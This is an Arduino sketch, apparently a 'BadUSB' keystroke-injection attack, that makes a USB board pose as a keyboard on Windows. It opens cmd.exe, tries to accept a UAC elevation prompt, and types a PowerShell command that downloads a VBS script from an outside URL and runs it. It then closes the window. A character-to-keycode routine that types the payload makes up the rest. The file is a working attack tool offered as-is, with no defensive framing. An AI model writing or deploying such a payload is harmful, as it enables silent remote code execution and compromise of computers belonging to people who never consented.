/* Code.ino */
/* USB DRIVEBY ( BADUSB ) */


//Modifier Keys
#define LEFT_SHIFT  0x02
#define LEFT_GUI    0x08

//Keys
#define KEY_ENTER 0x28

uint8_t buffBits[8] = { 0 }; 

void setup() 
{
  Serial.begin(9600);
  while(!Serial) {}
 
  sendKey(LEFT_GUI, 0x15); // Windows key(start) + R
  delay(200);
  sendString("cmd.exe");
  delay(200);          
  sendKey(0, KEY_ENTER);  // Open command line
  delay(500);
  
  // Incase of UAC prompt ( left arrow key to go to YES button then enter )
  sendKey(0,0x50); // Left arrow
  delay(200);
  sendKey(0,KEY_ENTER);
  // =====
  
  delay(200);
  sendString("PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/wessamza/Atmega16u2-BadUsb/master/script.vbs','x.vbs');(New-Object -com Shell.Application).ShellExecute('x.vbs');"); 
  delay(200);
  sendKey(0,KEY_ENTER);  // Exec command

  delay(200);
  sendString("exit");
  delay(200);
  sendKey(0,KEY_ENTER);
  

 
}
 
void loop() 
{

  /* do nothing yo bitch */
  
}



void sendKey(int keyMode, int key) {
  
  // send key
  buffBits[0] = keyMode;
  buffBits[2] = key;
  Serial.write(buffBits, 8);
  
  // Release
  buffBits[0] = 0;
  buffBits[2] = 0;
  Serial.write(buffBits, 8);  // Release key  
  
}

/* sendString code by sPkSoft For arduino UNO (modified)*/ 
void sendString(String text) {
  char alpha[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
  int mean_dic[] = {4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29};

  char normal_sym[] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '[', ']', '\\', ';', '\'',  ',', '.', '/', ' '};
  int mean_normal_sym[] = {0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x33, 0x34, 0x36, 0x37, 0x38, 0x2C};

  char temp_char;

  for(int i = 0;i<text.length();i++) {
    temp_char = text.charAt(i);


        if(temp_char == '(') // 0x26
        {
          sendKey(LEFT_SHIFT, 0x26);
          goto _done;
        } 
        else if(temp_char == ')') //  0x27
        {
          sendKey(LEFT_SHIFT, 0x27);
          goto _done;
        } 
        else if(temp_char == ':') // 0x33
        {
          sendKey(LEFT_SHIFT, 0x33);
          goto _done;
        }


    
    if(((int)temp_char >= 97 && (int)temp_char <= 122) || ((int)temp_char >= 65 && (int)temp_char <= 90)) {
      for(int j = 0;j<sizeof(mean_dic) - 1;j++) {
        if(temp_char == alpha[j]) {
          sendKey(0, mean_dic[j]);
          break;
        } else if(temp_char == toupper(alpha[j])) {
          sendKey(LEFT_SHIFT, mean_dic[j]);
          goto _done;
        }
      }
    } else 
    {

  
      for(int j = 0;j<sizeof(mean_normal_sym) - 1;j++) {
        if(temp_char == normal_sym[j]) {
          sendKey(0, mean_normal_sym[j]);
          goto _done;
        }
      }

       
     

     }

    _done: ;
    
  }
}
